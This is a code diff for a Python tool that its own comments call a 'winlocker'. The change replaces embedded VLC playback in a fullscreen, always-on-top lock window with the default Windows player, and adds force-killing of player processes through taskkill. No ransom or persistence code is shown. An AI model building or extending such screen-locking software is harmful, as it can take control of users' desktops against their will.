@@ -359,12 +359,6 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
     _video_stop = threading.Event()
     stop_event  = _video_stop
 
-    try:
-        import vlc  # type: ignore
-        has_vlc = True
-    except ImportError:
-        has_vlc = False
-
     root = make_fullscreen_root("#000000")
     _video_window = root
     threading.Thread(target=keep_on_top, args=(root, stop_event), daemon=True).start()
@@ -396,6 +390,8 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
 
     def do_close():
         stop_event.set()
+        _kill_video()
+        global _video_window
         _video_window = None
         root.destroy()
 
@@ -438,23 +434,26 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
         else:
             close_btn.pack()
 
-    # ── Video frame ───────────────────────────────────────────────────────────
-    if has_vlc:
-        video_frame = tk.Frame(root, bg="black")
-        video_frame.pack(fill="both", expand=True)
-        root.update()
+    # ── Video — открываем через встроенный плеер Windows ─────────────────────
+    # Запускаем видео в стандартном плеере (Кино и ТВ / WMP)
+    video_proc = subprocess.Popen(
+        ["cmd", "/c", "start", "", video_path],
+        shell=False
+    )
 
-        instance = vlc.Instance()
-        player   = instance.media_player_new()
-        media    = instance.media_new(video_path)
-        player.set_media(media)
-        player.set_hwnd(video_frame.winfo_id())
-        player.play()
-    else:
-        # Fallback: open with default player
-        subprocess.Popen(["start", "", video_path], shell=True)
-        tk.Label(root, text="▶  Воспроизведение...", bg="black", fg="white",
-                 font=("Segoe UI", 22)).pack(expand=True)
+    tk.Label(root, text="▶  Воспроизведение видео...", bg="black", fg="white",
+             font=("Segoe UI", 22)).pack(expand=True)
+
+    def _kill_video():
+        """Закрыть видео-плеер когда winlocker снимается."""
+        try:
+            # Убиваем по имени — работает для большинства плееров
+            subprocess.run(["taskkill", "/f", "/im", "Video.UI.exe"],
+                           capture_output=True)  # Кино и ТВ
+            subprocess.run(["taskkill", "/f", "/im", "wmplayer.exe"],
+                           capture_output=True)  # Windows Media Player
+        except Exception:
+            pass
 
     # ── Duration countdown before unlock ─────────────────────────────────────
     if duration > 0:
